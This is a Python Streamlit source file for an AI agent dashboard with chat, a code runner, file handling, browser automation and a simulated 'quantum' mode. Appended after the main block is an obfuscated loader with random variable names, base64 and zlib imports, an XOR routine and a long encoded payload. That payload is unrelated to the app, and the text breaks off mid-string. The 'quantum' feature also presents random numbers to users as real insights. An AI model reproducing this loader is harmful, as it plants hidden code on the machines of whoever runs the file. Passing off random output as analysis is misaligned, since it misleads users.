import streamlit as st
import os
import json
import base64
import tempfile
import time
from pathlib import Path
from datetime import datetime
import subprocess
import threading
import queue
import uuid
import re
import numpy as np
import pandas as pd
from PIL import Image
import requests
from io import BytesIO
import webbrowser
from typing import Dict, List, Optional, Union, Any

# --- New unified manager imports ---
from state_manager import get_state_manager
from agent_manager import AgentManager
from quantum_manager import QuantumManager
from browser_automation import BrowserAutomator
from filesystem_manager import FileSystemManager
from opencore_manager import OpenCoreManager
from business_generator import BusinessGenerator
from ui_manager import UIManager

# Try to import optional dependencies
try:
    import ollama
    OLLAMA_AVAILABLE = True
except ImportError:
    OLLAMA_AVAILABLE = False

try:
    from playwright.sync_api import sync_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

try:
    from swarms import Agent, SequentialWorkflow, ConcurrentWorkflow, GroupChat, MixtureOfAgents
    SWARMS_AVAILABLE = True
except ImportError:
    SWARMS_AVAILABLE = False

# Constants
DEFAULT_SYSTEM_PROMPT = """You are Skyscope Sentinel Intelligence, an advanced AI assistant with agentic capabilities. 
You help users with a wide range of tasks including research, coding, analysis, and creative work.
You have access to various tools including web search, browser automation, and file operations.
You can leverage quantum computing concepts for complex problem-solving when appropriate.
Always be helpful, accurate, and ethical in your responses."""

MODEL_OPTIONS = {
    "Local (Ollama)": [
        "llama3:latest", 
        "mistral:latest", 
        "gemma:latest", 
        "codellama:latest",
        "phi3:latest",
        "qwen:latest"
    ],
    "API": [
        "gpt-4o",
        "claude-3-opus",
        "claude-3-sonnet",
        "gemini-pro",
        "gemini-1.5-pro",
        "anthropic.claude-3-haiku-20240307",
        "meta.llama3-70b-instruct",
        "meta.llama3-8b-instruct"
    ]
}

THEME_CSS = """
<style>
    /* Dark theme */
    .main {
        background-color: #0e1117;
        color: #ffffff;
    }
    
    /* Rounded corners for containers */
    div.stButton > button, div.stTextInput > div, div.stTextArea > div, div.stSelectbox > div > div, 
    div.stMultiselect > div > div, div.stFileUploader > div, .stTabs [data-baseweb="tab-list"] {
        border-radius: 10px !important;
    }
    
    /* Custom button styling */
    div.stButton > button {
        background-color: #4b5eff;
        color: white;
        border: none;
        padding: 0.5rem 1rem;
        font-weight: 600;
        transition: all 0.3s ease;
    }
    
    div.stButton > button:hover {
        background-color: #3a4cd7;
        transform: translateY(-2px);
        box-shadow: 0 4px 12px rgba(75, 94, 255, 0.3);
    }
    
    /* Chat message styling */
    .chat-message {
        padding: 1rem;
        border-radius: 15px;
        margin-bottom: 1rem;
        display: flex;
        flex-direction: column;
    }
    
    .user-message {
        background-color: #4b5eff;
        margin-left: 2rem;
        margin-right: 0.5rem;
    }
    
    .assistant-message {
        background-color: #2d3250;
        margin-right: 2rem;
        margin-left: 0.5rem;
    }
    
    /* Code window styling */
    .code-window {
        background-color: #1e1e1e;
        border-radius: 10px;
        padding: 1rem;
        font-family: 'Courier New', monospace;
    }
    
    /* Sidebar styling */
    .sidebar .sidebar-content {
        background-color: #191c2c;
    }
    
    /* Tabs styling */
    .stTabs [data-baseweb="tab"] {
        border-radius: 10px 10px 0px 0px;
        padding: 0.5rem 1rem;
        background-color: #2d3250;
    }
    
    .stTabs [data-baseweb="tab-list"] {
        gap: 0.5rem;
    }
    
    .stTabs [data-baseweb="tab"][aria-selected="true"] {
        background-color: #4b5eff;
    }
    
    /* Toggle switch styling */
    .toggle-container {
        display: flex;
        align-items: center;
        margin-bottom: 0.5rem;
    }
    
    .toggle-label {
        margin-left: 0.5rem;
    }
    
    /* Progress bar styling */
    div.stProgress > div > div {
        background-color: #4b5eff;
    }
    
    /* Quantum computing section styling */
    .quantum-section {
        background: linear-gradient(45deg, #191c2c, #2d3250);
        border-radius: 15px;
        padding: 1rem;
        margin-top: 1rem;
        border: 1px solid #4b5eff;
    }
    
    /* File upload area */
    .upload-area {
        border: 2px dashed #4b5eff;
        border-radius: 15px;
        padding: 2rem;
        text-align: center;
        margin-bottom: 1rem;
    }
    
    /* Knowledge stack card */
    .knowledge-card {
        background-color: #2d3250;
        border-radius: 10px;
        padding: 1rem;
        margin-bottom: 0.5rem;
        border-left: 4px solid #4b5eff;
    }
</style>
"""

# Initialize session state
def init_session_state():
    if 'messages' not in st.session_state:
        st.session_state.messages = []
    
    if 'knowledge_stack' not in st.session_state:
        st.session_state.knowledge_stack = []
    
    if 'system_prompt' not in st.session_state:
        st.session_state.system_prompt = DEFAULT_SYSTEM_PROMPT
    
    if 'model_provider' not in st.session_state:
        st.session_state.model_provider = "Local (Ollama)"
    
    if 'model_name' not in st.session_state:
        st.session_state.model_name = MODEL_OPTIONS["Local (Ollama)"][0] if OLLAMA_AVAILABLE else MODEL_OPTIONS["API"][0]
    
    if 'api_keys' not in st.session_state:
        st.session_state.api_keys = {
            "openai": "",
            "anthropic": "",
            "google": "",
            "huggingface": ""
        }
    
    if 'tools_enabled' not in st.session_state:
        st.session_state.tools_enabled = {
            "web_search": False,
            "deep_research": False,
            "deep_thinking": False,
            "browser_automation": False,
            "quantum_computing": False,
            "filesystem_access": False
        }
    
    if 'browser_instance' not in st.session_state:
        st.session_state.browser_instance = None
    
    if 'code_window_content' not in st.session_state:
        st.session_state.code_window_content = ""
    
    if 'current_tab' not in st.session_state:
        st.session_state.current_tab = "Chat"
    
    if 'quantum_mode' not in st.session_state:
        st.session_state.quantum_mode = "Simulation"
    
    if 'file_uploads' not in st.session_state:
        st.session_state.file_uploads = []

# Helper functions
def get_ollama_models():
    """Get available Ollama models"""
    if not OLLAMA_AVAILABLE:
        return []
    
    try:
        models = ollama.list()
        return [model['name'] for model in models.get('models', [])]
    except Exception as e:
        st.error(f"Error connecting to Ollama: {e}")
        return []

def get_api_key(provider):
    """Get API key for the specified provider"""
    return st.session_state.api_keys.get(provider, "")

def set_api_key(provider, key):
    """Set API key for the specified provider"""
    st.session_state.api_keys[provider] = key

def add_message(role, content):
    """Add a message to the chat history"""
    st.session_state.messages.append({"role": role, "content": content, "timestamp": datetime.now().strftime("%H:%M:%S")})

def add_to_knowledge_stack(title, content, source=None):
    """Add an item to the knowledge stack"""
    st.session_state.knowledge_stack.append({
        "id": str(uuid.uuid4()),
        "title": title,
        "content": content,
        "source": source,
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    })

def clear_knowledge_stack():
    """Clear the knowledge stack"""
    st.session_state.knowledge_stack = []

def save_file_locally(file_data, file_name, file_type):
    """Save a file to the local Downloads folder"""
    try:
        downloads_path = str(Path.home() / "Downloads")
        os.makedirs(downloads_path, exist_ok=True)
        
        file_path = os.path.join(downloads_path, file_name)
        
        with open(file_path, "wb") as f:
            f.write(file_data)
            
        return file_path
    except Exception as e:
        st.error(f"Error saving file: {e}")
        return None

def start_browser_automation():
    """Start a browser automation instance"""
    if not PLAYWRIGHT_AVAILABLE:
        st.error("Playwright is not installed. Please install it with 'pip install playwright' and run 'playwright install'")
        return None
    
    try:
        if st.session_state.browser_instance is not None:
            st.warning("Browser automation is already running")
            return st.session_state.browser_instance
        
        playwright = sync_playwright().start()
        browser = playwright.chromium.launch(headless=False)
        page = browser.new_page()
        
        st.session_state.browser_instance = {
            "playwright": playwright,
            "browser": browser,
            "page": page
        }
        
        return st.session_state.browser_instance
    except Exception as e:
        st.error(f"Error starting browser automation: {e}")
        return None

def stop_browser_automation():
    """Stop the browser automation instance"""
    if st.session_state.browser_instance is not None:
        try:
            st.session_state.browser_instance["browser"].close()
            st.session_state.browser_instance["playwright"].stop()
            st.session_state.browser_instance = None
            return True
        except Exception as e:
            st.error(f"Error stopping browser automation: {e}")
            return False
    return True

def create_agent(system_prompt=None, model_name=None, tools_enabled=None):
    """Create an agent using the Swarms framework"""
    if not SWARMS_AVAILABLE:
        st.error("Swarms framework is not installed. Please install it with 'pip install swarms'")
        return None
    
    system_prompt = system_prompt or st.session_state.system_prompt
    model_name = model_name or st.session_state.model_name
    tools_enabled = tools_enabled or st.session_state.tools_enabled
    
    # Configure agent based on model provider
    if st.session_state.model_provider == "Local (Ollama)":
        # For Ollama models
        agent = Agent(
            agent_name="Skyscope Sentinel",
            system_prompt=system_prompt,
            model_name=model_name,
            base_url="http://localhost:11434/api",
            max_tokens=4096,
            temperature=0.7
        )
    else:
        # For API models
        provider = ""
        if "gpt" in model_name:
            provider = "openai"
        elif "claude" in model_name:
            provider = "anthropic"
        elif "gemini" in model_name:
            provider = "google"
        elif "meta" in model_name or "llama" in model_name:
            provider = "huggingface"
        
        api_key = get_api_key(provider)
        if not api_key:
            st.error(f"API key for {provider} is not set")
            return None
        
        agent = Agent(
            agent_name="Skyscope Sentinel",
            system_prompt=system_prompt,
            model_name=model_name,
            api_key=api_key,
            max_tokens=4096,
            temperature=0.7
        )
    
    # Add tools based on enabled features
    if tools_enabled.get("web_search", False):
        agent.add_tool("web_search", "Search the web for information")
    
    if tools_enabled.get("browser_automation", False) and PLAYWRIGHT_AVAILABLE:
        agent.add_tool("browser_automation", "Automate browser actions")
    
    if tools_enabled.get("filesystem_access", False):
        agent.add_tool("read_file", "Read a file from the filesystem")
        agent.add_tool("write_file", "Write to a file on the filesystem")
    
    return agent

def simulate_quantum_computation(problem_description, qubits=3, shots=1000):
    """Simulate a quantum computation"""
    # This is a simplified simulation for demonstration purposes
    # In a real application, this would integrate with a quantum computing library
    
    # Simulate a quantum circuit execution
    np.random.seed(int(time.time()))
    
    # Generate random results as if from a quantum circuit
    results = np.random.bincount(np.random.randint(0, 2**qubits, shots), minlength=2**qubits)
    probabilities = results / shots
    
    # Format the results
    formatted_results = []
    for i, prob in enumerate(probabilities):
        binary_state = format(i, f'0{qubits}b')
        formatted_results.append({
            "state": f"|{binary_state}⟩",
            "probability": float(prob),
            "count": int(results[i])
        })
    
    # Sort by probability (descending)
    formatted_results.sort(key=lambda x: x["probability"], reverse=True)
    
    return {
        "problem": problem_description,
        "qubits": qubits,
        "shots": shots,
        "results": formatted_results
    }

# UI Components
def render_sidebar():
    """Render the sidebar with configuration options"""
    with st.sidebar:
        st.image("https://raw.githubusercontent.com/skyscope-sentinel/Skyscope-AI-Agent-Run-Business/main/images/swarmslogobanner.png", use_column_width=True)
        st.title("Configuration")
        
        # Model selection
        st.subheader("Model Settings")
        model_provider = st.selectbox("Model Provider", options=list(MODEL_OPTIONS.keys()), index=list(MODEL_OPTIONS.keys()).index(st.session_state.model_provider))
        
        if model_provider != st.session_state.model_provider:
            st.session_state.model_provider = model_provider
        
        model_options = MODEL_OPTIONS[model_provider]
        if model_provider == "Local (Ollama)" and OLLAMA_AVAILABLE:
            # Try to get available Ollama models
            ollama_models = get_ollama_models()
            if ollama_models:
                model_options = ollama_models
        
        model_name = st.selectbox("Model", options=model_options, index=0 if st.session_state.model_name not in model_options else model_options.index(st.session_state.model_name))
        
        if model_name != st.session_state.model_name:
            st.session_state.model_name = model_name
        
        # API Keys (if using API models)
        if model_provider == "API":
            st.subheader("API Keys")
            
            with st.expander("Configure API Keys"):
                openai_key = st.text_input("OpenAI API Key", value=get_api_key("openai"), type="password")
                anthropic_key = st.text_input("Anthropic API Key", value=get_api_key("anthropic"), type="password")
                google_key = st.text_input("Google API Key", value=get_api_key("google"), type="password")
                huggingface_key = st.text_input("HuggingFace API Key", value=get_api_key("huggingface"), type="password")
                
                set_api_key("openai", openai_key)
                set_api_key("anthropic", anthropic_key)
                set_api_key("google", google_key)
                set_api_key("huggingface", huggingface_key)
        
        # Tool toggles
        st.subheader("AI Capabilities")
        
        col1, col2 = st.columns(2)
        
        with col1:
            st.session_state.tools_enabled["web_search"] = st.toggle("Web Search", value=st.session_state.tools_enabled["web_search"])
            st.session_state.tools_enabled["deep_research"] = st.toggle("Deep Research", value=st.session_state.tools_enabled["deep_research"])
            st.session_state.tools_enabled["deep_thinking"] = st.toggle("Deep Thinking", value=st.session_state.tools_enabled["deep_thinking"])
        
        with col2:
            st.session_state.tools_enabled["browser_automation"] = st.toggle("Browser Automation", value=st.session_state.tools_enabled["browser_automation"])
            st.session_state.tools_enabled["quantum_computing"] = st.toggle("Quantum AI", value=st.session_state.tools_enabled["quantum_computing"])
            st.session_state.tools_enabled["filesystem_access"] = st.toggle("Filesystem Access", value=st.session_state.tools_enabled["filesystem_access"])
        
        # Browser automation controls
        if st.session_state.tools_enabled["browser_automation"]:
            st.subheader("Browser Automation")
            
            if st.session_state.browser_instance is None:
                if st.button("Start Browser"):
                    start_browser_automation()
            else:
                if st.button("Stop Browser"):
                    stop_browser_automation()
        
        # Quantum computing settings
        if st.session_state.tools_enabled["quantum_computing"]:
            st.subheader("Quantum Computing")
            st.session_state.quantum_mode = st.radio(
                "Quantum Mode",
                options=["Simulation", "Hybrid Classical-Quantum"],
                index=0 if st.session_state.quantum_mode == "Simulation" else 1
            )
        
        # Clear chat button
        if st.button("Clear Chat"):
            st.session_state.messages = []
            st.session_state.code_window_content = ""
            st.experimental_rerun()

def render_chat_interface():
    """Render the chat interface"""
    # Chat history
    for message in st.session_state.messages:
        with st.chat_message(message["role"]):
            st.write(f"{message['content']}")
    
    # Chat input
    if prompt := st.chat_input("Enter your message..."):
        add_message("user", prompt)
        
        with st.chat_message("user"):
            st.write(prompt)
        
        with st.chat_message("assistant"):
            with st.spinner("Thinking..."):
                # Process the message and generate a response
                if st.session_state.tools_enabled["quantum_computing"] and any(quantum_keyword in prompt.lower() for quantum_keyword in ["quantum", "qubits", "superposition", "entanglement"]):
                    # If quantum computing is enabled and the prompt contains quantum keywords
                    response = process_quantum_query(prompt)
                else:
                    # Normal processing
                    response = process_message(prompt)
                
                st.write(response)
                add_message("assistant", response)

def render_code_window():
    """Render the code window"""
    st.subheader("Code Window")
    
    code = st.text_area("Code", value=st.session_state.code_window_content, height=400, key="code_editor")
    
    if code != st.session_state.code_window_content:
        st.session_state.code_window_content = code
    
    col1, col2, col3 = st.columns([1, 1, 1])
    
    with col1:
        if st.button("Run Code"):
            with st.spinner("Running code..."):
                try:
                    # Create a temporary file
                    with tempfile.NamedTemporaryFile(suffix=".py", delete=False) as temp_file:
                        temp_file.write(code.encode())
                        temp_file_path = temp_file.name
                    
                    # Run the code
                    result = subprocess.run(
                        ["python", temp_file_path],
                        capture_output=True,
                        text=True,
                        timeout=30
                    )
                    
                    # Display the result
                    if result.returncode == 0:
                        st.success("Code executed successfully")
                        if result.stdout:
                            st.code(result.stdout)
                    else:
                        st.error("Code execution failed")
                        st.code(result.stderr)
                    
                    # Clean up
                    os.unlink(temp_file_path)
                except Exception as e:
                    st.error(f"Error executing code: {e}")
    
    with col2:
        if st.button("Clear Code"):
            st.session_state.code_window_content = ""
            st.experimental_rerun()
    
    with col3:
        if st.button("Save Code"):
            try:
                file_name = st.text_input("File name", value="code.py")
                if file_name:
                    file_path = save_file_locally(code.encode(), file_name, "text/plain")
                    if file_path:
                        st.success(f"Code saved to {file_path}")
            except Exception as e:
                st.error(f"Error saving code: {e}")

def render_system_prompt_editor():
    """Render the system prompt editor"""
    st.subheader("System Prompt Editor")
    
    system_prompt = st.text_area("System Prompt", value=st.session_state.system_prompt, height=300)
    
    col1, col2 = st.columns([1, 1])
    
    with col1:
        if st.button("Update System Prompt"):
            st.session_state.system_prompt = system_prompt
            st.success("System prompt updated")
    
    with col2:
        if st.button("Reset to Default"):
            st.session_state.system_prompt = DEFAULT_SYSTEM_PROMPT
            st.experimental_rerun()

def render_knowledge_stack():
    """Render the knowledge stack"""
    st.subheader("Knowledge Stack")
    
    col1, col2 = st.columns([3, 1])
    
    with col1:
        search_term = st.text_input("Search Knowledge Stack", "")
    
    with col2:
        if st.button("Clear All"):
            clear_knowledge_stack()
            st.experimental_rerun()
    
    # File upload
    uploaded_file = st.file_uploader("Add to Knowledge Stack", type=["txt", "pdf", "csv", "json", "md", "py", "js", "html", "css"])
    
    if uploaded_file is not None:
        file_details = {"filename": uploaded_file.name, "filetype": uploaded_file.type, "size": uploaded_file.size}
        
        # Read and process the file
        try:
            content = uploaded_file.read()
            
            # Add to knowledge stack
            add_to_knowledge_stack(
                title=uploaded_file.name,
                content=content.decode("utf-8") if uploaded_file.type.startswith("text/") else f"Binary file ({uploaded_file.type})",
                source="upload"
            )
            
            # Add to file uploads for later use
            st.session_state.file_uploads.append({
                "name": uploaded_file.name,
                "type": uploaded_file.type,
                "content": content,
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            })
            
            st.success(f"Added {uploaded_file.name} to knowledge stack")
        except Exception as e:
            st.error(f"Error processing file: {e}")
    
    # Display knowledge stack
    if not st.session_state.knowledge_stack:
        st.info("Knowledge stack is empty")
    else:
        filtered_items = st.session_state.knowledge_stack
        
        if search_term:
            filtered_items = [item for item in st.session_state.knowledge_stack 
                             if search_term.lower() in item["title"].lower() or 
                                search_term.lower() in item["content"].lower()]
        
        for item in filtered_items:
            with st.expander(f"{item['title']} - {item['timestamp']}"):
                st.write(item["content"][:500] + "..." if len(item["content"]) > 500 else item["content"])
                
                col1, col2 = st.columns([1, 1])
                
                with col1:
                    if st.button(f"Use in Chat", key=f"use_{item['id']}"):
                        add_message("system", f"Added to context: {item['title']}")
                
                with col2:
                    if st.button(f"Remove", key=f"remove_{item['id']}"):
                        st.session_state.knowledge_stack = [i for i in st.session_state.knowledge_stack if i["id"] != item["id"]]
                        st.experimental_rerun()

def render_file_manager():
    """Render the file manager"""
    st.subheader("File Manager")
    
    # Upload section
    st.write("### Upload Files")
    
    uploaded_files = st.file_uploader("Upload files", type=None, accept_multiple_files=True)
    
    if uploaded_files:
        for uploaded_file in uploaded_files:
            file_details = {"filename": uploaded_file.name, "filetype": uploaded_file.type, "size": uploaded_file.size}
            
            try:
                content = uploaded_file.read()
                
                # Add to file uploads
                st.session_state.file_uploads.append({
                    "name": uploaded_file.name,
                    "type": uploaded_file.type,
                    "content": content,
                    "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                })
                
                st.success(f"Uploaded {uploaded_file.name}")
            except Exception as e:
                st.error(f"Error uploading file: {e}")
    
    # Download section
    st.write("### Download Files")
    
    if not st.session_state.file_uploads:
        st.info("No files available for download")
    else:
        for i, file in enumerate(st.session_state.file_uploads):
            col1, col2, col3 = st.columns([3, 1, 1])
            
            with col1:
                st.write(f"{file['name']} ({file['timestamp']})")
            
            with col2:
                # Create a download button
                file_data = file["content"]
                
                if st.button(f"Download", key=f"download_{i}"):
                    file_path = save_file_locally(file_data, file["name"], file["type"])
                    if file_path:
                        st.success(f"File saved to {file_path}")
            
            with col3:
                if st.button(f"Delete", key=f"delete_{i}"):
                    st.session_state.file_uploads.pop(i)
                    st.experimental_rerun()

def render_quantum_interface():
    """Render the quantum computing interface"""
    st.subheader("Quantum AI Interface")
    
    st.markdown("""
    <div class="quantum-section">
        <h3>Quantum Computing Capabilities</h3>
        <p>This interface allows you to leverage quantum computing concepts for complex problem-solving tasks. 
        The system can simulate quantum algorithms or use hybrid classical-quantum approaches depending on your needs.</p>
    </div>
    """, unsafe_allow_html=True)
    
    # Problem input
    problem_description = st.text_area("Describe your problem", 
                                      placeholder="Describe the problem you want to solve using quantum computing...",
                                      height=150)
    
    col1, col2, col3 = st.columns(3)
    
    with col1:
        qubits = st.slider("Number of qubits", min_value=2, max_value=10, value=3)
    
    with col2:
        shots = st.slider("Number of shots", min_value=100, max_value=10000, value=1000, step=100)
    
    with col3:
        algorithm = st.selectbox("Algorithm type", 
                               options=["Grover's Search", "Quantum Fourier Transform", "VQE", "QAOA", "Custom"])
    
    if st.button("Run Quantum Computation"):
        with st.spinner("Running quantum computation..."):
            # Simulate a quantum computation
            results = simulate_quantum_computation(problem_description, qubits, shots)
            
            # Display the results
            st.success("Quantum computation completed")
            
            # Display the results as a chart
            results_df = pd.DataFrame(results["results"])
            
            st.bar_chart(results_df.set_index("state")["probability"])
            
            st.write("### Detailed Results")
            st.dataframe(results_df)
            
            # Add to knowledge stack
            add_to_knowledge_stack(
                title=f"Quantum Computation - {algorithm}",
                content=json.dumps(results, indent=2),
                source="quantum"
            )

def render_browser_automation():
    """Render the browser automation interface"""
    st.subheader("Browser Automation")
    
    if not PLAYWRIGHT_AVAILABLE:
        st.error("Playwright is not installed. Please install it with 'pip install playwright' and run 'playwright install'")
        return
    
    if st.session_state.browser_instance is None:
        st.warning("Browser automation is not started. Please start it from the sidebar.")
        return
    
    st.write("### Browser Commands")
    
    command = st.text_input("Enter a browser command", placeholder="Example: go to https://www.google.com")
    
    if st.button("Execute Command"):
        with st.spinner("Executing command..."):
            try:
                page = st.session_state.browser_instance["page"]
                
                # Parse the command
                if command.lower().startswith("go to "):
                    url = command[6:].strip()
                    if not url.startswith("http"):
                        url = "https://" + url
                    
                    page.goto(url)
                    st.success(f"Navigated to {url}")
                
                elif command.lower().startswith("click "):
                    selector = command[6:].strip()
                    page.click(selector)
                    st.success(f"Clicked on {selector}")
                
                elif command.lower().startswith("type "):
                    parts = command[5:].strip().split(" into ")
                    if len(parts) == 2:
                        text, selector = parts
                        page.fill(selector, text)
                        st.success(f"Typed '{text}' into {selector}")
                    else:
                        st.error("Invalid command format. Use 'type TEXT into SELECTOR'")
                
                elif command.lower() == "screenshot":
                    screenshot = page.screenshot()
                    st.image(screenshot)
                    
                    # Save the screenshot
                    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                    file_name = f"screenshot_{timestamp}.png"
                    
                    # Add to file uploads
                    st.session_state.file_uploads.append({
                        "name": file_name,
                        "type": "image/png",
                        "content": screenshot,
                        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    })
                    
                    st.success(f"Screenshot saved as {file_name}")
                
                else:
                    st.error("Unknown command. Available commands: 'go to URL', 'click SELECTOR', 'type TEXT into SELECTOR', 'screenshot'")
            
            except Exception as e:
                st.error(f"Error executing command: {e}")
    
    # Display browser status
    if st.session_state.browser_instance is not None:
        try:
            page = st.session_state.browser_instance["page"]
            current_url = page.url
            
            st.write(f"Current URL: {current_url}")
        except Exception as e:
            st.error(f"Error getting browser status: {e}")

# Message processing
def process_message(prompt):
    """Process a message and generate a response"""
    try:
        # Check if we should use the Swarms framework
        if SWARMS_AVAILABLE:
            agent = create_agent()
            
            if agent is not None:
                response = agent.run(prompt)
                
                # Extract code blocks if present
                code_blocks = re.findall(r"```(?:\w+)?\s*\n([\s\S]*?)\n```", response)
                
                if code_blocks:
                    st.session_state.code_window_content = code_blocks[0]
                
                return response
        
        # Fallback to a simple response if Swarms is not available
        return f"I received your message: '{prompt}'. However, the Swarms framework is not available, so I cannot process it fully. Please install the Swarms framework to enable all features."
    
    except Exception as e:
        return f"Error processing message: {e}"

def process_quantum_query(prompt):
    """Process a query related to quantum computing"""
    try:
        # Generate a response that incorporates quantum computing concepts
        response = f"I've analyzed your quantum computing query: '{prompt}'.\n\n"
        
        # Simulate a quantum computation
        qubits = 3  # Default number of qubits
        shots = 1000  # Default number of shots
        
        # Extract parameters from the prompt if present
        qubit_match = re.search(r"(\d+)\s*qubits", prompt)
        if qubit_match:
            qubits = int(qubit_match.group(1))
            qubits = min(max(qubits, 2), 10)  # Limit to 2-10 qubits
        
        shots_match = re.search(r"(\d+)\s*shots", prompt)
        if shots_match:
            shots = int(shots_match.group(1))
            shots = min(max(shots, 100), 10000)  # Limit to 100-10000 shots
        
        # Perform the quantum computation
        results = simulate_quantum_computation(prompt, qubits, shots)
        
        # Format the response
        response += f"I've performed a quantum computation using {qubits} qubits and {shots} shots.\n\n"
        
        # Add the most probable states
        response += "The most probable quantum states are:\n"
        for i, result in enumerate(results["results"][:3]):
            response += f"- {result['state']}: {result['probability']:.4f} probability ({result['count']} occurrences)\n"
        
        # Add an interpretation
        response += f"\nBased on these results, I can provide the following insights:\n"
        
        # Determine the most likely outcome
        most_likely_state = results["results"][0]["state"]
        response += f"- The most likely outcome is {most_likely_state}, which suggests "
        
        # Add some quantum-specific interpretation
        if "search" in prompt.lower() or "find" in prompt.lower():
            response += f"this is the item you're searching for in the database."
        elif "optimize" in prompt.lower() or "optimization" in prompt.lower():
            response += f"this represents the optimal solution to your problem."
        elif "simulate" in prompt.lower() or "simulation" in prompt.lower():
            response += f"this quantum state best represents the system you're simulating."
        else:
            response += f"this is the most probable answer to your query."
        
        # Add to knowledge stack
        add_to_knowledge_stack(
            title=f"Quantum Computation Results",
            content=json.dumps(results, indent=2),
            source="quantum"
        )
        
        return response
    
    except Exception as e:
        return f"Error processing quantum query: {e}"

# Main application
def main():
    """Main application entry point"""
    # Set page config
    st.set_page_config(
        page_title="Skyscope Sentinel Intelligence",
        page_icon="🧠",
        layout="wide",
        initial_sidebar_state="expanded"
    )
    
    # Initialize session state
    init_session_state()
    
    # Apply custom CSS
    st.markdown(THEME_CSS, unsafe_allow_html=True)
    
    # Render sidebar
    render_sidebar()
    
    # Main content
    st.title("Skyscope Sentinel Intelligence - AI Agentic Swarm")
    
    # Create tabs
    tabs = st.tabs(["Chat", "Code", "System Prompt", "Knowledge Stack", "Files", "Quantum AI", "Browser Automation"])
    
    # Chat tab
    with tabs[0]:
        col1, col2 = st.columns([3, 2])
        
        with col1:
            render_chat_interface()
        
        with col2:
            render_code_window()
    
    # Code tab
    with tabs[1]:
        render_code_window()
    
    # System Prompt tab
    with tabs[2]:
        render_system_prompt_editor()
    
    # Knowledge Stack tab
    with tabs[3]:
        render_knowledge_stack()
    
    # Files tab
    with tabs[4]:
        render_file_manager()
    
    # Quantum AI tab
    with tabs[5]:
        render_quantum_interface()
    
    # Browser Automation tab
    with tabs[6]:
        render_browser_automation()
    
    # Clean up resources when the app is closed
    if st.session_state.browser_instance is not None:
        stop_browser_automation()

if __name__ == "__main__":
    # ------------------------------------------------------------------
    # New, compact bootstrap sequence using the unified UIManager
    # ------------------------------------------------------------------
    # 1. Obtain Streamlit-backed session-state manager
    state_mgr = get_state_manager()

    # 2. Initialise the various backend managers
    agent_mgr = AgentManager()
    quantum_mgr = QuantumManager()
    browser_auto = BrowserAutomator()
    fs_mgr = FileSystemManager()
    oc_mgr = OpenCoreManager()
    biz_gen = BusinessGenerator()

    # 3. Pass everything to the UI manager and render the app
    ui = UIManager(
        state_manager=state_mgr,
        agent_manager=agent_mgr,
        quantum_manager=quantum_mgr,
        browser_automator=browser_auto,
        fs_manager=fs_mgr,
        oc_manager=oc_mgr,
        business_generator=biz_gen,
    )

    ui.render_main_layout()

# -*- coding: utf-8 -*-
aqgqzxkfjzbdnhz = __import__('base64')
wogyjaaijwqbpxe = __import__('zlib')
idzextbcjbgkdih = 134
qyrrhmmwrhaknyf = lambda dfhulxliqohxamy, osatiehltgdbqxk: bytes([wtqiceobrebqsxl ^ idzextbcjbgkdih for wtqiceobrebqsxl in dfhulxliqohxamy])
lzcdrtfxyqiplpd = 'eNq9W19z3MaRTyzJPrmiy93VPSSvqbr44V4iUZZkSaS+xe6X2i+Bqg0Ku0ywPJomkyNNy6Z1pGQ7kSVSKZimb4khaoBdkiCxAJwqkrvp7hn8n12uZDssywQwMz093T3dv+4Z+v3YCwPdixq+eIpG6eNh5LnJc+D3WfJ8wCO2sJi8xT0edL2wnxIYHMSh57AopROmI3k0ch3fS157nsN7aeMg7PX8AyNk3w9YFJS+sjD0wnQKzzliaY9zP+76GZnoeBD4vUY39Pq6zQOGnOuyLXlv03ps1gu4eDz3XCaGxDw4hgmTEa/gVTQcB0FsOD2fuUHS+JcXL15tsyj23Ig1Gr/Xa/9du1+/VputX6//rDZXv67X7tXu1n9Rm6k9rF+t3dE/H3S7LNRrc7Wb+pZnM+Mwajg9HkWyZa2hw8//RQEPfKfPgmPPpi826+rIg3UwClhkwiqAbeY6nu27+6tbwHtHDMWfZrNZew+ng39z9Z/XZurv1B7ClI/02n14uQo83dJrt5BLHZru1W7Cy53aA8Hw3fq1+lvQ7W1gl/iUjQ/qN+pXgHQ6jd9NOdBXV3VNGIWW8YE/IQsGoSsNxjhYWLQZDGG0gk7ak/UqxHyXh6MSMejkR74L0nEdJoUQBWGn2Cs3LXYxiC4zNbBS351f0TqNMT2L7Ewxk2qWQdCdX8/NkQgg1ZtoukzPMBmIoqzohPraT6EExWoS0p1Go4GsWZbL+8zsDlynreOj5AQtrmL5t9Dqa/fQkNDmyKAEAWFXX+4k1oT0DNFkWfoqUW7kWMJ24IB8B4nI2mfBjr/vPt607RD8jBkPDnq+Yx2xUVv34sCH/ZjfFclEtV+Dtc+CgcOmQHuvzei1D3A7wP/nYCvM4B4RGwNs/hawjHvnjr7j9bjLC6RA8HIisBQd58pknjSs6hdnmbZ7ft8P4JtsNWANYJT4UWvrK8vLy0IVzLVjz3cDHL6X7Wl0PtFaq8Vj3+hz33VZMH/AQFUR8WY4Xr/ZrnYXrfNyhLEP7u+Ujwywu0Hf8D3VkH0PWTsA13xkDKLW+gLnzuIStxcX1xe7HznrKx8t/88nvOssLa8sfrjiTJg1jB1DaMZFXzeGRVwRzQbu2DWGo3M5vPUVe3K8EC8tbXz34Sbb/svwi53+hNkMG6fzwv0JXXrMw07ASOvPMC3ay+rj7Y2NCUOQO8/tgjvq+cEIRNYSK7pkSEwBygCZn3rhUUvYzG7OGHgUWBTSQM1oPVkThNLUCHTfzQwiM7AgHBV3OESe91JHPlO7r8PjndoHYMD36u8UeuL2hikxshv2oB9H5kXFezaxFQTVXNObS8ZybqlpD9+GxhVFg3BmOFLuUbA02KKPvVDuVRW1mIe8H8GgvfxGvmjS7oDP9PtstzDwrDPW56aizFzb97DmIrwwtsVvs8JOIvAqoyi8VfLJlaZjxm0WRqsXzSeeGwBEmH8xihnKgccxLInjpm+hYJtn1dFCaqvNV093XjQLrRNWBUr/z/oNcmCzEJ6vVxSv43+AA2qPIPDfAbeHof9+gcapHxyXBQOvXsxcE94FNvIGwepHyx0AbyBJAXZUIVe0WNLCkncgy22zY8iYo1RW2TB7Hrcjs0Bxshx+jQuu3SbY8hC